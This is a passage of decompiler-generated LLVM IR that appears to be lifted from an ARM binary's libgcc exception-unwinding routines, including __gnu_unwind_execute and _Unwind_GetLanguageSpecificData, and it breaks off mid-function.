  uselistorder i32* @r8, { 275, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 1, 274, 0, 36, 276, 9, 277, 37, 38, 39, 40, 23, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 33, 34, 35, 41, 42, 43, 44, 10, 278, 20, 21, 4, 22, 11, 175, 176, 5, 177, 178, 179, 207, 208, 209, 210, 211, 7, 212, 213, 214, 215, 216, 217, 218, 219, 161, 162, 163, 164, 220, 221, 222, 223, 224, 142, 143, 144, 145, 225, 226, 227, 228, 12, 13, 87, 88, 89, 90, 91, 229, 230, 231, 232, 92, 93, 94, 95, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 15, 16, 17, 18, 19, 14, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 77, 78, 79, 81, 82, 83, 84, 85, 86, 96, 97, 98, 99, 100, 101, 102, 103, 104, 108, 105, 106, 107, 109, 110, 111, 112, 113, 115, 114, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 165, 166, 2, 170, 167, 168, 169, 171, 172, 173, 174, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 204, 201, 202, 203, 8, 205, 206, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 6, 253, 254, 255, 256 }
  uselistorder i32 32, { 104, 101, 102, 103, 65, 105, 106, 61, 77, 107, 60, 97, 66, 62, 86, 84, 85, 81, 82, 83, 90, 91, 87, 88, 79, 80, 67, 95, 96, 98, 1, 2, 4, 3, 99, 6, 5, 8, 7, 10, 9, 63, 68, 64, 100, 69, 89, 12, 11, 14, 13, 16, 15, 18, 17, 78, 20, 19, 21, 23, 22, 25, 24, 26, 27, 29, 28, 70, 71, 92, 30, 93, 31, 94, 32, 72, 73, 33, 34, 35, 36, 37, 74, 38, 39, 40, 75, 41, 0, 42, 43, 44, 46, 45, 48, 47, 50, 49, 51, 53, 52, 55, 54, 57, 56, 58, 59, 76 }
  uselistorder i32 28, { 48, 11, 32, 49, 29, 50, 51, 52, 53, 7, 33, 34, 30, 31, 38, 12, 35, 13, 45, 46, 47, 8, 14, 0, 19, 1, 20, 2, 21, 3, 22, 4, 23, 5, 24, 6, 25, 15, 26, 16, 27, 17, 28, 9, 18, 37, 36, 39, 40, 41, 42, 43, 44, 10 }
  uselistorder i32 24, { 107, 106, 108, 12, 13, 109, 0, 65, 66, 67, 68, 69, 70, 63, 64, 14, 71, 72, 82, 83, 73, 74, 8, 15, 100, 101, 102, 105, 1, 84, 85, 86, 41, 42, 9, 75, 76, 49, 77, 60, 44, 45, 46, 47, 48, 50, 51, 52, 53, 16, 54, 17, 55, 18, 56, 57, 58, 59, 61, 62, 78, 79, 80, 81, 19, 20, 21, 22, 2, 23, 24, 10, 87, 88, 25, 26, 3, 27, 89, 28, 29, 30, 11, 90, 31, 32, 33, 91, 34, 4, 92, 93, 94, 95, 35, 36, 96, 37, 97, 38, 5, 98, 6, 39, 99, 103, 40, 104, 7, 43 }
  uselistorder i32 20, { 126, 124, 125, 127, 1, 4, 11, 35, 128, 31, 129, 130, 131, 132, 5, 133, 134, 2, 135, 36, 12, 32, 33, 34, 37, 38, 39, 50, 51, 40, 41, 136, 109, 110, 111, 112, 113, 114, 115, 13, 116, 117, 119, 3, 52, 14, 53, 54, 0, 25, 43, 44, 15, 45, 16, 46, 24, 17, 47, 42, 48, 49, 55, 57, 6, 56, 58, 59, 60, 61, 62, 63, 7, 64, 65, 66, 67, 68, 69, 71, 72, 18, 70, 73, 74, 75, 76, 77, 78, 80, 81, 19, 79, 82, 83, 84, 85, 87, 88, 20, 86, 89, 90, 91, 92, 93, 94, 96, 21, 95, 97, 98, 99, 102, 8, 100, 22, 101, 103, 104, 107, 9, 105, 23, 106, 108, 118, 26, 27, 28, 29, 30, 120, 121, 122, 10, 123 }
  uselistorder i32* @r1, { 191, 15, 16, 17, 4, 192, 193, 65, 66, 82, 45, 2, 195, 46, 194, 138, 47, 48, 49, 18, 67, 1, 68, 69, 19, 198, 20, 5, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 6, 216, 217, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 71, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 3, 81, 25, 140, 97, 98, 218, 21, 220, 221, 222, 223, 103, 104, 84, 29, 30, 31, 219, 22, 32, 33, 141, 142, 129, 130, 131, 132, 133, 134, 135, 44, 143, 7, 136, 137, 8, 144, 147, 145, 9, 146, 85, 86, 23, 148, 149, 150, 139, 122, 123, 12, 34, 35, 36, 37, 38, 39, 40, 10, 226, 227, 228, 229, 0, 230, 24, 83, 99, 151, 224, 225, 152, 26, 196, 197, 27, 13, 87, 100, 153, 154, 28, 155, 156, 88, 89, 41, 42, 43, 90, 91, 92, 93, 94, 124, 95, 96, 14, 101, 102, 125, 126, 11, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 127, 128, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 3, 34, 35, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 12, 11, 2, 13, 14, 15, 16, 17, 31, 32, 28, 29, 4, 5, 1, 6, 0, 7, 30, 8, 9, 10, 33 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1aaa8 = load i32, i32* @r0, align 4
  ret i32 %v1_1aaa8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1aab0 = load i32, i32* @r0, align 4
  ret i32 %v1_1aab0
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1aac4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1aac8 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_1aac4, i32 0)
  ret i32 %v2_1aac8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1aae8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1aaec = call i32 @__gnu_Unwind_Resume(i32 %v2_1aae8, i32 0)
  ret i32 %v2_1aaec

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1ab0c = ptrtoint i32* %stack_var_-68 to i32
  %v2_1ab10 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_1ab0c, i32 0)
  ret i32 %v2_1ab10

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1ab30 = ptrtoint i32* %stack_var_-68 to i32
  %v6_1ab34 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_1ab30, i32 %arg2, i8* %arg3, i32 %v2_1ab30)
  ret i32 %v6_1ab34

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1ab60 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1ab68 = add i32 %tmp1, 76
  %v2_1ab68 = inttoptr i32 %v1_1ab68 to i32*
  %v3_1ab68 = load i32, i32* %v2_1ab68, align 4
  %v1_1ab6c = add i32 %v3_1ab68, 7
  %v2_1ab6c = inttoptr i32 %v1_1ab6c to i8*
  %v3_1ab6c = load i8, i8* %v2_1ab6c, align 1
  %v4_1ab6c = zext i8 %v3_1ab6c to i32
  %v1_1ab70 = add i32 %v3_1ab68, 8
  %v3_1ab74 = mul nuw nsw i32 %v4_1ab6c, 4
  %v2_1ab78 = add i32 %v3_1ab74, %v1_1ab70
  %v3_1ab78 = inttoptr i32 %v2_1ab78 to i8*
  ret i8* %v3_1ab78
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_1ab88 = load i32, i32* @r6, align 4
  %v21_1ab88 = load i32, i32* @lr, align 4
  %v0_1ab8c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1ab8c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_1ab9c

dec_label_pc_1ab9c:                               ; preds = %dec_label_pc_1ab9c.backedge, %entry
  %v3_1aba8 = phi i32 [ %v0_1ab9c.pre, %dec_label_pc_1ab9c.backedge ], [ %tmp, %entry ]
  %v1_1ab9c = add i32 %v3_1aba8, 8
  %v2_1ab9c = inttoptr i32 %v1_1ab9c to i8*
  %v3_1ab9c = load i8, i8* %v2_1ab9c, align 1
  %v4_1ab9c = zext i8 %v3_1ab9c to i32
  store i32 %v4_1ab9c, i32* %r3.global-to-local, align 4
  %v2_1aba0 = icmp eq i8 %v3_1ab9c, 0
  store i1 %v2_1aba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aba0, label %dec_label_pc_1abb0, label %.thread

.thread:                                          ; preds = %dec_label_pc_1ab9c
  %v2_1aba4 = add nsw i32 %v4_1ab9c, -1
  store i32 %v2_1aba4, i32* %r3.global-to-local, align 4
  %v2_1aba8 = trunc i32 %v2_1aba4 to i8
  store i8 %v2_1aba8, i8* %v2_1ab9c, align 1
  %v0_1abac.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1abac.pr.pr, label %.thread.dec_label_pc_1abb0_crit_edge, label %dec_label_pc_1abd8

.thread.dec_label_pc_1abb0_crit_edge:             ; preds = %.thread
  %v0_1abb0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1abb0

dec_label_pc_1abb0:                               ; preds = %.thread.dec_label_pc_1abb0_crit_edge, %dec_label_pc_1ab9c
  %v0_1abb0 = phi i32 [ %v0_1abb0.pre, %.thread.dec_label_pc_1abb0_crit_edge ], [ %v3_1aba8, %dec_label_pc_1ab9c ]
  %v1_1abb0 = add i32 %v0_1abb0, 9
  %v2_1abb0 = inttoptr i32 %v1_1abb0 to i8*
  %v3_1abb0 = load i8, i8* %v2_1abb0, align 1
  %v4_1abb0 = zext i8 %v3_1abb0 to i32
  store i32 %v4_1abb0, i32* %r3.global-to-local, align 4
  %v2_1abb4 = icmp eq i8 %v3_1abb0, 0
  store i1 %v2_1abb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1abb4, label %dec_label_pc_1acb8, label %dec_label_pc_1abbc

dec_label_pc_1abbc:                               ; preds = %dec_label_pc_1acac, %dec_label_pc_1abb0
  %v2_1abc0 = phi i32 [ %v0_1acac, %dec_label_pc_1acac ], [ %v0_1abb0, %dec_label_pc_1abb0 ]
  %v0_1abbc = phi i32 [ %v4_1acac, %dec_label_pc_1acac ], [ %v4_1abb0, %dec_label_pc_1abb0 ]
  %v1_1abbc = add nsw i32 %v0_1abbc, -1
  store i32 %v1_1abbc, i32* %r3.global-to-local, align 4
  %v1_1abc0 = trunc i32 %v1_1abbc to i8
  %v3_1abc0 = add i32 %v2_1abc0, 9
  %v4_1abc0 = inttoptr i32 %v3_1abc0 to i8*
  store i8 %v1_1abc0, i8* %v4_1abc0, align 1
  %v0_1abc4 = load i32, i32* @r5, align 4
  %v1_1abc4 = add i32 %v0_1abc4, 4
  %v2_1abc4 = inttoptr i32 %v1_1abc4 to i32*
  %v3_1abc4 = load i32, i32* %v2_1abc4, align 4
  store i32 %v3_1abc4, i32* %r2.global-to-local, align 4
  %v1_1abc8 = inttoptr i32 %v3_1abc4 to i32*
  %v2_1abc8 = load i32, i32* %v1_1abc8, align 4
  store i32 %v2_1abc8, i32* %r0.global-to-local, align 4
  %v4_1abc8 = add i32 %v3_1abc4, 4
  store i32 %v4_1abc8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1abd0 = inttoptr i32 %v0_1abc4 to i32*
  store i32 %v2_1abc8, i32* %v1_1abd0, align 4
  %v5_1abd0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1abd0, i32* %v2_1abc4, align 4
  %v0_1abd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1abd4 = trunc i32 %v0_1abd4 to i8
  %v2_1abd4 = load i32, i32* @r5, align 4
  %v3_1abd4 = add i32 %v2_1abd4, 8
  %v4_1abd4 = inttoptr i32 %v3_1abd4 to i8*
  store i8 %v1_1abd4, i8* %v4_1abd4, align 1
  br label %dec_label_pc_1abd8

dec_label_pc_1abd8:                               ; preds = %.thread, %dec_label_pc_1abbc, %.thread6
  %v0_1abd8 = load i32, i32* @r5, align 4
  %v1_1abd8 = inttoptr i32 %v0_1abd8 to i32*
  %v2_1abd8 = load i32, i32* %v1_1abd8, align 4
  %v3_1abdc = udiv i32 %v2_1abd8, 16777216
  store i32 %v3_1abdc, i32* @r4, align 4
  store i32 %v3_1abdc, i32* %ip.global-to-local, align 4
  %v3_1abe4 = mul i32 %v2_1abd8, 256
  store i32 %v3_1abe4, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_1abd8, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1abe4, i32* %v1_1abd8, align 4
  br i1 %tmp183, label %dec_label_pc_1acb8, label %dec_label_pc_1abf4

dec_label_pc_1abf4:                               ; preds = %dec_label_pc_1abd8
  %v0_1abf4 = load i32, i32* @r4, align 4
  %v1_1abf4 = and i32 %v0_1abf4, 128
  store i32 %v1_1abf4, i32* %r1.global-to-local, align 4
  %v2_1abf4 = icmp eq i32 %v1_1abf4, 0
  store i1 %v2_1abf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1abf4, label %dec_label_pc_1acd0, label %dec_label_pc_1abfc

dec_label_pc_1abfc:                               ; preds = %dec_label_pc_1abf4
  %v1_1abfc = and i32 %v0_1abf4, 240
  store i32 %v1_1abfc, i32* @r6, align 4
  %v7_1ac00 = icmp eq i32 %v1_1abfc, 128
  store i1 %v7_1ac00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ac00, label %dec_label_pc_1ac08, label %dec_label_pc_1ad2c

dec_label_pc_1ac08:                               ; preds = %dec_label_pc_1abfc
  %v0_1ac08 = load i32, i32* @r5, align 4
  %v1_1ac08 = add i32 %v0_1ac08, 8
  %v2_1ac08 = inttoptr i32 %v1_1ac08 to i8*
  %v3_1ac08 = load i8, i8* %v2_1ac08, align 1
  %v4_1ac08 = zext i8 %v3_1ac08 to i32
  store i32 %v4_1ac08, i32* %r3.global-to-local, align 4
  %v2_1ac0c = icmp eq i8 %v3_1ac08, 0
  store i1 %v2_1ac0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac0c, label %dec_label_pc_1ac1c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1ac08
  %v2_1ac10 = add nsw i32 %v4_1ac08, -1
  store i32 %v2_1ac10, i32* %r3.global-to-local, align 4
  %v2_1ac14 = trunc i32 %v2_1ac10 to i8
  store i8 %v2_1ac14, i8* %v2_1ac08, align 1
  %v0_1ac18.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ac18.pr.pr, label %.thread3.dec_label_pc_1ac1c_crit_edge, label %dec_label_pc_1ac4c

.thread3.dec_label_pc_1ac1c_crit_edge:            ; preds = %.thread3
  %v0_1ac1c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ac1c

dec_label_pc_1ac1c:                               ; preds = %.thread3.dec_label_pc_1ac1c_crit_edge, %dec_label_pc_1ac08
  %v2_1ac30 = phi i32 [ %v0_1ac1c.pre, %.thread3.dec_label_pc_1ac1c_crit_edge ], [ %v0_1ac08, %dec_label_pc_1ac08 ]
  %v1_1ac1c = add i32 %v2_1ac30, 9
  %v2_1ac1c = inttoptr i32 %v1_1ac1c to i8*
  %v3_1ac1c = load i8, i8* %v2_1ac1c, align 1
  %v4_1ac1c = zext i8 %v3_1ac1c to i32
  store i32 %v4_1ac1c, i32* %r3.global-to-local, align 4
  %v2_1ac20 = icmp eq i8 %v3_1ac1c, 0
  store i1 %v2_1ac20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac20, label %dec_label_pc_1ac5c, label %dec_label_pc_1ac2c

dec_label_pc_1ac2c:                               ; preds = %dec_label_pc_1ac1c
  %v1_1ac2c = add nsw i32 %v4_1ac1c, -1
  store i32 %v1_1ac2c, i32* %r3.global-to-local, align 4
  %v1_1ac30 = trunc i32 %v1_1ac2c to i8
  store i8 %v1_1ac30, i8* %v2_1ac1c, align 1
  %v0_1ac34 = load i32, i32* @r5, align 4
  %v1_1ac34 = add i32 %v0_1ac34, 4
  %v2_1ac34 = inttoptr i32 %v1_1ac34 to i32*
  %v3_1ac34 = load i32, i32* %v2_1ac34, align 4
  store i32 %v3_1ac34, i32* %r2.global-to-local, align 4
  %v1_1ac38 = inttoptr i32 %v3_1ac34 to i32*
  %v2_1ac38 = load i32, i32* %v1_1ac38, align 4
  store i32 %v2_1ac38, i32* %r0.global-to-local, align 4
  %v4_1ac38 = add i32 %v3_1ac34, 4
  store i32 %v4_1ac38, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1ac38, i32* %v2_1ac34, align 4
  %v0_1ac44 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ac44 = trunc i32 %v0_1ac44 to i8
  %v2_1ac44 = load i32, i32* @r5, align 4
  %v3_1ac44 = add i32 %v2_1ac44, 8
  %v4_1ac44 = inttoptr i32 %v3_1ac44 to i8*
  store i8 %v1_1ac44, i8* %v4_1ac44, align 1
  %v0_1ac48 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ac48 = load i32, i32* @r5, align 4
  %v2_1ac48 = inttoptr i32 %v1_1ac48 to i32*
  store i32 %v0_1ac48, i32* %v2_1ac48, align 4
  br label %dec_label_pc_1ac4c

dec_label_pc_1ac4c:                               ; preds = %.thread3, %dec_label_pc_1ac2c
  %v0_1ac4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1ac4c, i32* %r3.global-to-local, align 4
  %v3_1ac50 = mul i32 %v0_1ac4c, 256
  store i32 %v3_1ac50, i32* %r0.global-to-local, align 4
  %v1_1ac54 = load i32, i32* @r5, align 4
  %v2_1ac54 = inttoptr i32 %v1_1ac54 to i32*
  store i32 %v3_1ac50, i32* %v2_1ac54, align 4
  %v0_1ac58 = load i32, i32* %r3.global-to-local, align 4
  %v3_1ac58 = udiv i32 %v0_1ac58, 16777216
  br label %dec_label_pc_1ac5c

dec_label_pc_1ac5c:                               ; preds = %dec_label_pc_1ac1c, %dec_label_pc_1ac4c
  %storemerge133 = phi i32 [ %v3_1ac58, %dec_label_pc_1ac4c ], [ 176, %dec_label_pc_1ac1c ]
  %v1_1ac5c = load i32, i32* %ip.global-to-local, align 4
  %v4_1ac5c = mul i32 %v1_1ac5c, 256
  %v5_1ac5c = or i32 %v4_1ac5c, %storemerge133
  store i32 %v5_1ac5c, i32* %r2.global-to-local, align 4
  %v7_1ac60 = icmp eq i32 %v5_1ac5c, 32768
  store i1 %v7_1ac60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ac60, label %dec_label_pc_1ae6c, label %dec_label_pc_1ac68

dec_label_pc_1ac68:                               ; preds = %dec_label_pc_1ac5c
  %v3_1ac68 = mul i32 %v5_1ac5c, 16
  store i32 %v3_1ac68, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1ac78 = and i32 %v3_1ac68, 65520
  store i32 %v3_1ac78, i32* %r2.global-to-local, align 4
  %v0_1ac7c = load i32, i32* @r7, align 4
  store i32 %v0_1ac7c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1ac84 = call i32 @_Unwind_VRS_Pop(i32 %v0_1ac7c, i32 %v3_1ac78, i32 0, i32 0)
  store i32 %v4_1ac84, i32* %r0.global-to-local, align 4
  %v2_1ac88 = icmp eq i32 %v4_1ac84, 0
  store i1 %v2_1ac88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac88, label %dec_label_pc_1ac90, label %dec_label_pc_1ae6c

dec_label_pc_1ac90:                               ; preds = %dec_label_pc_1ac68
  %v0_1ac90 = load i32, i32* @r5, align 4
  %v1_1ac90 = add i32 %v0_1ac90, 8
  %v2_1ac90 = inttoptr i32 %v1_1ac90 to i8*
  %v3_1ac90 = load i8, i8* %v2_1ac90, align 1
  %v4_1ac90 = zext i8 %v3_1ac90 to i32
  store i32 %v4_1ac90, i32* %r3.global-to-local, align 4
  %v0_1ac94 = load i32, i32* @r4, align 4
  %v1_1ac94 = and i32 %v0_1ac94, 32768
  %v2_1ac94 = icmp eq i32 %v1_1ac94, 0
  store i1 %v2_1ac94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac94, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_1ac90
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1ac90, %bb147
  %v2_1ac9c = icmp eq i8 %v3_1ac90, 0
  store i1 %v2_1ac9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac9c, label %dec_label_pc_1acac, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_1aca0 = add nsw i32 %v4_1ac90, -1
  store i32 %v2_1aca0, i32* %r3.global-to-local, align 4
  %v2_1aca4 = trunc i32 %v2_1aca0 to i8
  store i8 %v2_1aca4, i8* %v2_1ac90, align 1
  %v0_1aca8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1aca8.pr.pr, label %.thread6.dec_label_pc_1acac_crit_edge, label %dec_label_pc_1abd8

.thread6.dec_label_pc_1acac_crit_edge:            ; preds = %.thread6
  %v0_1acac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1acac

dec_label_pc_1acac:                               ; preds = %bb148, %.thread6.dec_label_pc_1acac_crit_edge
  %v0_1acac = phi i32 [ %v0_1acac.pre, %.thread6.dec_label_pc_1acac_crit_edge ], [ %v0_1ac90, %bb148 ]
  %v1_1acac = add i32 %v0_1acac, 9
  %v2_1acac = inttoptr i32 %v1_1acac to i8*
  %v3_1acac = load i8, i8* %v2_1acac, align 1
  %v4_1acac = zext i8 %v3_1acac to i32
  store i32 %v4_1acac, i32* %r3.global-to-local, align 4
  %v2_1acb0 = icmp eq i8 %v3_1acac, 0
  store i1 %v2_1acb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1acb0, label %dec_label_pc_1acb8, label %dec_label_pc_1abbc

dec_label_pc_1acb8:                               ; preds = %dec_label_pc_1acac, %dec_label_pc_1abb0, %dec_label_pc_1abd8
  %v0_1acb8 = load i32, i32* @sl, align 4
  %v2_1acb8 = icmp eq i32 %v0_1acb8, 0
  store i1 %v2_1acb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1acb8, label %dec_label_pc_1ad80, label %bb149

bb149:                                            ; preds = %dec_label_pc_1acb8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1acc4

dec_label_pc_1acc4:                               ; preds = %bb149, %dec_label_pc_1b234, %dec_label_pc_1b0d4, %dec_label_pc_1aef8, %dec_label_pc_1aeb0, %dec_label_pc_1ae6c, %dec_label_pc_1ad80
  %v1_1accc = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_1b234 ], [ 9, %dec_label_pc_1b0d4 ], [ 9, %dec_label_pc_1aef8 ], [ 9, %dec_label_pc_1aeb0 ], [ 9, %dec_label_pc_1ae6c ], [ %v0_1adb4, %dec_label_pc_1ad80 ]
  store i32 %v9_1ab88, i32* %r6.global-to-local, align 4
  store i32 %v21_1ab88, i32* @lr, align 4
  ret i32 %v1_1accc

dec_label_pc_1acd0:                               ; preds = %dec_label_pc_1abf4
  %v1_1acd0 = mul i32 %v0_1abf4, 4
  %v3_1acd4 = and i32 %v1_1acd0, 252
  store i32 %v3_1acd4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1ace0 = load i32, i32* @r7, align 4
  store i32 %v0_1ace0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_1ace8 = add nuw nsw i32 %v3_1acd4, 4
  store i32 %v1_1ace8, i32* %r6.global-to-local, align 4
  %v5_1acf0 = call i32 @_Unwind_VRS_Get(i32 %v0_1ace0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1acf4 = load i32, i32* @r4, align 4
  %v1_1acf4 = and i32 %v0_1acf4, 64
  %v2_1acf4 = icmp eq i32 %v1_1acf4, 0
  store i1 %v2_1acf4, i1* %cpsr_z.global-to-local, align 1
  %v4_1acfc = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1ad08 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_1ad08
  %storemerge160.p = select i1 %v2_1acf4, i32 %v2_1ad08, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1acfc
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_1ad24 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1ad24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ab9c.backedge

dec_label_pc_1ab9c.backedge:                      ; preds = %dec_label_pc_1acd0, %dec_label_pc_1ad4c, %dec_label_pc_1b1d0, %dec_label_pc_1ae9c, %dec_label_pc_1aed4, %dec_label_pc_1ae54, %dec_label_pc_1b0c0
  %v0_1ab9c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ab9c

dec_label_pc_1ad2c:                               ; preds = %dec_label_pc_1abfc
  %v7_1ad2c = icmp eq i32 %v1_1abfc, 144
  store i1 %v7_1ad2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ad2c, label %dec_label_pc_1ad34, label %dec_label_pc_1ae74

dec_label_pc_1ad34:                               ; preds = %dec_label_pc_1ad2c
  %v1_1ad34 = urem i32 %v0_1abf4, 16
  store i32 %v1_1ad34, i32* %r2.global-to-local, align 4
  %v2_1ad38 = icmp eq i32 %v1_1ad34, 15
  store i1 %v2_1ad38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad38, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_1ad34
  %v8_1ad3c = icmp eq i32 %v1_1ad34, 13
  store i1 %v8_1ad3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1ad3c, label %bb154, label %dec_label_pc_1ad4c

.thread21:                                        ; preds = %dec_label_pc_1ad34
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ae6c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ae6c

dec_label_pc_1ad4c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1ad58 = load i32, i32* @r7, align 4
  store i32 %v0_1ad58, i32* %r0.global-to-local, align 4
